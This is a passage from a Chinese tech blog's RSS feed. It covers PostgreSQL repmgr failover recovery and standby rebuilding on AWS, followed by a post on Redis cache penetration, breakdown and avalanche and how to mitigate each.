# 等待阶段 Status 为 ? unreachable， 此时主库正在执行健康检查， 等待主库恢复中
$&amp;gt; sudo -u postgres repmgr cluster show

### 集群状态恢复后，可以观察VIP是否已经漂移到新主节点了，如果没有，需要观察日志 /var/log/repmgr/vip_failover_switch.log, 其中记录了VIP的漂移过程，不过此时原主库上仍然绑定着VIP，可以手动删除，或者直接忽略，VIP的实现是靠的亚马逊私有辅助IP实现的，服务器上直接绑定无效，需要AWS绑定了，服务器上才能实际添加，该VIP会在注册从节点时自动删除， 手动删除key使用
# $&amp;gt; ip addr del 10.0.1.100/20 dev ens5 # systemctl restart systemd-networkd

# 从库晋升主库后的恢复
# 启动原主库
$&amp;gt; systemctl start postgresql@16-main.service
# 将原主库置为从库 
$&amp;gt; sudo -u postgres touch /data/_pgsql_data/16/main/standby.signal &amp;amp;&amp;amp; sudo chmod 600 /data/_pgsql_data/16/main/standby.signal
# 修正 原主库的 primary_conninfo 连接信息 
$&amp;gt; vim /data/_pgsql_data/16/main/postgresql.auto.conf
## 如果配置文件中不存在，则直接添加， 注意 host 是主节点信息， application_name 是当前节点 /etc/repmgr.conf 中的 node_name
primary_conninfo = &amp;#39;host=10.0.3.114 port=5432 user=repmgr password={{ REPMGR_PASSWORD }} application_name=pgsql_node_01&amp;#39;

# 重载配置
$&amp;gt; sudo systemctl reload postgresql@16-main.service # sudo systemctl restart postgresql@16-main.service
# 重启 repmgrd 服务
$&amp;gt; sudo systemctl restart repmgrd
# 查看集群状态
$&amp;gt; sudo -u postgres repmgr cluster show
# 注意此时集群状态可能有两种情况，一种是 Status 没有任何标识， Upstream 也没有任何标识， 这种情况代表同步恢复完成，但是注册信息更新失败，可以等待一段时间后在观察，若仍然没有恢复，则重新注册一下，此时一般需要强制注册, --upstream-node-id 是主节点的node_id , 还有一种带有！号的， 代表同步重建完全失败， 这个可能是两者数据流差异过大引起，此时重建同步 
$&amp;gt; sudo -u postgres repmgr standby register -f /etc/repmgr.conf --upstream-node-id=1 --force&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;重建模式&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;## 创建 /var/lib/postgresql/.pgpass 文件，用于重新克隆服务基准数据时使用
$&amp;gt; touch /var/lib/postgresql/.pgpass &amp;amp;&amp;amp; chown postgres:postgres /var/lib/postgresql/.pgpass &amp;amp;&amp;amp; chmod 600 /var/lib/postgresql/.pgpass
$&amp;gt; /var/lib/postgresql/.pgpass 
10.0.3.114:5432:repmgr:repmgr:{{ REPMGR_PASSWORD }}
10.0.2.113:5432:repmgr:repmgr:{{ REPMGR_PASSWORD }}


# 停止新从节点
$&amp;gt; sudo systemctl stop postgresql@16-main

# 备份数据目录
$&amp;gt; sudo mv /data/_pgsql_data/16/main /data/_pgsql_data/16/main.backup.$(date &amp;#43;%Y%m%d_%H%M%S)

# 使用正确的配置重新克隆
# host 为新主节点IP
$&amp;gt; sudo -u postgres repmgr standby clone --force --verbose --host=10.0.3.114 --port=5432 --user=repmgr --dbname=repmgr

# 启动从节点
sudo systemctl start postgresql@16-main

# 重新注册
sudo -u postgres repmgr standby register --force

# 验证
sudo -u postgres repmgr node status
sudo -u postgres psql -c &amp;#34;SELECT * FROM pg_stat_wal_receiver;&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 class="heading-element" id="其他"&gt;&lt;span&gt;其他&lt;/span&gt;
 &lt;a href="#%e5%85%b6%e4%bb%96" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;本文记录是根据实际搭建和测试完成后的草稿重新编写，实操时可能会有些新问题产生，有问题自行解决&lt;/li&gt;
&lt;/ul&gt;</description></item><item><title>Redis高并发常见3大问题</title><link>https://blog.0x5c0f.cc/posts/linux/redis%E9%AB%98%E5%B9%B6%E5%8F%91%E5%B8%B8%E8%A7%813%E5%A4%A7%E9%97%AE%E9%A2%98/</link><pubDate>Tue, 20 May 2025 00:00:00 +0000</pubDate><author>mail@0x5c0f.cc (0x5c0f)</author><guid>https://blog.0x5c0f.cc/posts/linux/redis%E9%AB%98%E5%B9%B6%E5%8F%91%E5%B8%B8%E8%A7%813%E5%A4%A7%E9%97%AE%E9%A2%98/</guid><description>&lt;h2 class="heading-element" id="缓存穿透"&gt;&lt;span&gt;缓存穿透&lt;/span&gt;
 &lt;a href="#%e7%bc%93%e5%ad%98%e7%a9%bf%e9%80%8f" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;p&gt;  他是指大量请求访问的数据，在缓存和数据库中均不存在，导致请求直接穿透缓存层，频繁访问数据库，造成数据库压力过大，响应过慢，甚至宕机。其原因可能是黑客构造大量不存在的key发送请求，或者业务代码逻辑&lt;code&gt;bug&lt;/code&gt;，查询了大量&lt;code&gt;key&lt;/code&gt;不存在或者无效数据。&lt;/p&gt;
&lt;h3 class="heading-element" id="解决方案"&gt;&lt;span&gt;解决方案&lt;/span&gt;
 &lt;a href="#%e8%a7%a3%e5%86%b3%e6%96%b9%e6%a1%88" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;在数据查询不到数据时，向&lt;code&gt;redis&lt;/code&gt;缓存一个空值，并设置一个较短的过期时间(比如&lt;code&gt;5&lt;/code&gt;分钟)，这样下次请求相同的&lt;code&gt;key&lt;/code&gt;时就能命中缓存，将空值返回给客户端。&lt;/li&gt;
&lt;li&gt;使用布隆过滤器对所有的key进行预判，对于不存在的&lt;code&gt;key&lt;/code&gt;，直接返回或拒绝请求，只有存在的&lt;code&gt;key&lt;/code&gt;才会去查询缓存&lt;/li&gt;
&lt;li&gt;对请求参数进行校验，过滤掉明显无效的请求，如ID格式必须合法等，只有合法的&lt;code&gt;ID&lt;/code&gt;才会去查询缓存&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 class="heading-element" id="缓存击穿"&gt;&lt;span&gt;缓存击穿&lt;/span&gt;
 &lt;a href="#%e7%bc%93%e5%ad%98%e5%87%bb%e7%a9%bf" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;p&gt;  他是指某个热点数据在缓存中过期，导致大量请求同时访问数据库，造成数据库瞬间压力过大，甚至服务不可用&lt;/p&gt;
&lt;h3 class="heading-element" id="解决方案-1"&gt;&lt;span&gt;解决方案&lt;/span&gt;
 &lt;a href="#%e8%a7%a3%e5%86%b3%e6%96%b9%e6%a1%88-1" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;对于核心热点数据，可以设置永不过期，或者使用定时任务定期更新缓存，确保热点数据可以命中缓存&lt;/li&gt;
&lt;li&gt;在缓存失效时，使用分布式锁(如&lt;code&gt;redis&lt;/code&gt;的&lt;code&gt;setnx&lt;/code&gt;)保证只有一个请求去查询数据库，其他请求等待，该请求查询到数据库后在更新到缓存中，这样后续请求就又能命中缓存了&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 class="heading-element" id="缓存雪崩"&gt;&lt;span&gt;缓存雪崩&lt;/span&gt;
 &lt;a href="#%e7%bc%93%e5%ad%98%e9%9b%aa%e5%b4%a9" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;p&gt;  他是指大量缓存数据在同一时间点过期，导致大量请求直接访问数据库，造成数据库崩溃，可能的原因是设置了相同的过期时间，或者redis服务器宕机或者重启&lt;/p&gt;
&lt;h3 class="heading-element" id="解决方案-2"&gt;&lt;span&gt;解决方案&lt;/span&gt;
 &lt;a href="#%e8%a7%a3%e5%86%b3%e6%96%b9%e6%a1%88-2" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;设置不同的过期时间，避免大量数据同时过期&lt;/li&gt;
&lt;li&gt;缓存预热，在系统启动时，提前将热点数据加载到缓存中&lt;/li&gt;
&lt;li&gt;熔断降级，使用熔断器(如&lt;code&gt;Hystrix&lt;/code&gt;)对请求进行限流，限制数据库访问量，当数据库压力过大时候，直接返回默认值或错误提示&lt;/li&gt;
&lt;/ul&gt;</description></item></channel></rss>